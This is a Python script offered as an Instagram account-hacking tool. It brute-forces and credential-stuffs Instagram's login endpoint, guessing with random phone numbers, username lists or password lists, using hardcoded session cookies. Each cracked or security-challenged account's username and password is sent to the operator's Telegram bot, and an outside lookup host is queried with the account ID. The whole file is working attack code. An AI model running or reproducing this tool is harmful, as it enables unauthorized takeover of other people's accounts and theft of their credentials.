from requests import post,get;import requests,sys,time
from random import *
from os import system
from time import sleep
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
j = '\033[2;35m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m' 
b=0
a=0
c=0
Token = input(f"{X}[{F}+{X}]{C} Enter {Z}Token {C}Bot TelleGram :- {Z}")
Id = input(f"{X}[{F}+{X}]{C} Enter {Z}ID {C}Account TelleGram :- {Z}")
system('clear')
def Login():
	global Z,X,Z1,F,A,j,C,B,Y,E,b,a,c
	Num = "12345098761234567890"
	V = str(''.join(choice(["12","13","14","15","16","17","18","19"])))
	pas = str(''.join(choice(Num) for i in range(7)))
	user = "+989"+V+pas
	head = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'content-length':'322',
'content-type':'application/x-www-form-urlencoded',
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; shbid="10365,53358207778,1691684390:01f73f547c1ec96deebeea0d54830b380e0f6fb12a7f193216a61365a0dd54aa7910e0da"; shbts="1660148390,53358207778,1691684390:01f7b7a7daf2988ef2a998bed11b633ab01022f88d4cb7c1cdf11cbd687b168fe2c3b42f"; dpr=1.75; datr=H9vzYq35j3WCu3W5Jw-BuqMb; rur="LDC,10851247180,1691685227:01f7384326eadde6b86b6e846d607a492aa0dc1129c56a6dfa9f24656775a17ed6d951a4"; csrftoken=0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-prefers-color-scheme':'light',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR0WvdbBzERaM1Ho5PaSxxSd8SpAKdFzw6OZ-3tawfWifKhp',
'x-instagram-ajax':'730e073623b1',
'x-requested-with':'XMLHttpRequest',}
	Login_IG = post("https://www.instagram.com/accounts/login/ajax/",headers=head,data={'username': user,'enc_password':"#PWD_INSTAGRAM_BROWSER:0:&:"+pas})
	if "userId" in Login_IG.text:
		a+=1
		ID = Login_IG.json()['userId']
		lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}")
		iok = lok.json()
		date = str(iok['data'])
		print( F+"Successul Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,F,user,B,F,pas)+F+" :- "+str(a))
		post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=New Acount For You :
< Secure >
*••••••••••••••••••••••••••••••••••••••*
Phone Number :- {user}
PassWord :- {pas}
Date :- {date}
*••••••••••••••••••••••••••••••••••••••*
FrOm :- MR.KRISANJIT''')
	else:
		b+=1
		print(Z+"Wrong Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,Z,user,B,Z,pas)+C+" :- "+str(b))
def Combo_User():
	ch = input(f'{X}[{F}={X}] {B}Enter Long User :- {Z}')
	cu = input(f'{X}[{F}={X}] {B} Enter the Number of Usernames :- {Z}')
	for i in range(int(cu)):
		User = "12a_sdf34ghjklp57oiyutr78e_wqz90xcvbnm"
		r_User = str(''.join(choice(User) for i in range(int(ch))))
		print(r_User)
		open('Combo_User.txt','a').write(r_User+'\n')

def Login_Combo():
	global Z,X,Z1,F,A,j,C,B,Y,E,b,a,c
	pas = input(f"{F}[{Z}={F}]{C}Enter Passwors :- "+B)
	file = input(f"{F}[{Z}={F}]{C}Enter Combo Name User :- ")
	for user in open(file,'r').read().splitlines():
		head = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'content-length':'322',
'content-type':'application/x-www-form-urlencoded',
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; shbid="10365,53358207778,1691684390:01f73f547c1ec96deebeea0d54830b380e0f6fb12a7f193216a61365a0dd54aa7910e0da"; shbts="1660148390,53358207778,1691684390:01f7b7a7daf2988ef2a998bed11b633ab01022f88d4cb7c1cdf11cbd687b168fe2c3b42f"; dpr=1.75; datr=H9vzYq35j3WCu3W5Jw-BuqMb; rur="LDC,10851247180,1691685227:01f7384326eadde6b86b6e846d607a492aa0dc1129c56a6dfa9f24656775a17ed6d951a4"; csrftoken=0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-prefers-color-scheme':'light',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR0WvdbBzERaM1Ho5PaSxxSd8SpAKdFzw6OZ-3tawfWifKhp',
'x-instagram-ajax':'730e073623b1',
'x-requested-with':'XMLHttpRequest',}
		try:
			Login_IG = post("https://www.instagram.com/accounts/login/ajax/",headers=head,data={'username': user,'enc_password':"#PWD_INSTAGRAM_BROWSER:0:&:"+pas})
			if "userId" in Login_IG.text:
				a+=1
				ID = Login_IG.json()['userId']
				lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}")
				iok = lok.json()
				date = str(iok['data'])
				print( F+"Successul Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,F,user,B,F,pas)+F+" :- "+str(a))
				post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=New Acount For You :
< Secure >
*••••••••••••••••••••••••••••••••••••••*
Phone Number :- {user}
PassWord :- {pas}
Date :- {date}
*••••••••••••••••••••••••••••••••••••••*
FrOm :- MR.KRISANJIT''')
			elif 'challenge' in Login_IG.text:
					c+=1
					print(X+"Secur Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,X,user,B,X,pas)+C+" :- "+str(c))
					post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=New Acount For You :
< Secure >
*••••••••••••••••••••••••••••••••••••••*
Phone Number :- {user}
PassWord :- {pas}
Date :- {date}
*••••••••••••••••••••••••••••••••••••••*
FrOm :- MR.KRISANJIT''')
			else:
				b+=1
				print(Z+"Wrong Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,Z,user,B,Z,pas)+C+" :- "+str(b))
		except requests.exceptions.ConnectionError:
			sleep(6)

def Login_k():
	global Z,X,Z1,F,A,j,C,B,Y,E,b,a,c
	user = input(f"{F}[{Z}={F}]{C}Enter User :- "+B)
	file = input(f"{F}[{Z}={F}]{C}Enter Combo Name Password :- ")
	for pas in open(file,'r').read().splitlines():	
		head = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'content-length':'322',
'content-type':'application/x-www-form-urlencoded',
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; shbid="10365,53358207778,1691684390:01f73f547c1ec96deebeea0d54830b380e0f6fb12a7f193216a61365a0dd54aa7910e0da"; shbts="1660148390,53358207778,1691684390:01f7b7a7daf2988ef2a998bed11b633ab01022f88d4cb7c1cdf11cbd687b168fe2c3b42f"; dpr=1.75; datr=H9vzYq35j3WCu3W5Jw-BuqMb; rur="LDC,10851247180,1691685227:01f7384326eadde6b86b6e846d607a492aa0dc1129c56a6dfa9f24656775a17ed6d951a4"; csrftoken=0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-prefers-color-scheme':'light',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR0WvdbBzERaM1Ho5PaSxxSd8SpAKdFzw6OZ-3tawfWifKhp',
'x-instagram-ajax':'730e073623b1',
'x-requested-with':'XMLHttpRequest',}
		try:
			Login_IG = post("https://www.instagram.com/accounts/login/ajax/",headers=head,data={'username': user,'enc_password':"#PWD_INSTAGRAM_BROWSER:0:&:"+pas})
			if "userId" in Login_IG.text:
				a+=1
				ID = Login_IG.json()['userId']
				lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}")
				iok = lok.json()
				date = str(iok['data'])
				print( F+"Successul Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,F,user,B,F,pas)+F+" :- "+str(a))
				post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=New Acount For You :
< Secure >
*••••••••••••••••••••••••••••••••••••••*
Phone Number :- {user}
PassWord :- {pas}
Date :- {date}
*••••••••••••••••••••••••••••••••••••••*
FrOm :- MR.KRISANJIT''')
			elif 'challenge' in Login_IG.text:
				c+=1
				print(X+"Secur Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,X,user,B,X,pas)+C+" :- "+str(c))
				post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=New Acount For You :
< Secure >
*••••••••••••••••••••••••••••••••••••••*
Phone Number :- {user}
PassWord :- {pas}
Date :- {date}
*••••••••••••••••••••••••••••••••••••••*
FrOm :- MR.KRISANJIT''')
			else:
				b+=1
				print(Z+"Wrong Account {}==> UserName {}:- {} {}| PassWord {}:- {}".format(B,Z,user,B,Z,pas)+C+" :- "+str(b))
		except requests.exceptions.ConnectionError:
			sleep(6)
rh = f'''{F}   ____         __     __  __         
  / __/_ ______/ /__   \ \/ /__  __ __
 / _// // / __/  '_/    \  / _ \/ // /
{X}/_/  \_,_/\__/_/\_\     /_/\___/\_,_/ 
                                      '''
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(3/1000)
jalan(rh)
print(C+f"Bio Tool :\n{Z}My Account TelleGram :- {F}@K_HACKER_ANONYMOUS")
print(C+"="*58)
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(0.006)
jalan(f'''{Z}({F}1{Z}) {B}hack random insta accounts {Z}•\n{Z}({F}2{Z}) {B}Instagram hack with password combo {Z}•\n{Z}({F}3{Z}) {B}hack instagram with usernames combo {Z}•\n{Z}({F}4{Z}) {B}Creating usernames {Z}•''')
print(C+"_"*58)
Alaa = input(f"{F}[{Z}-{F}] {X}Choose Bro :- {C}")
if Alaa == '1':
	system('clear')
	print(X+"Ok please wait...")
	sleep(2)
	while True:
		try:
			Login()
		except requests.exceptions.ConnectionError:
			sleep(6)		
if Alaa == '2':
	system('clear')
	Login_k()
if Alaa == '3':
	system('clear')
	Login_Combo()
if Alaa == '4':
	system('clear')
	Combo_User()	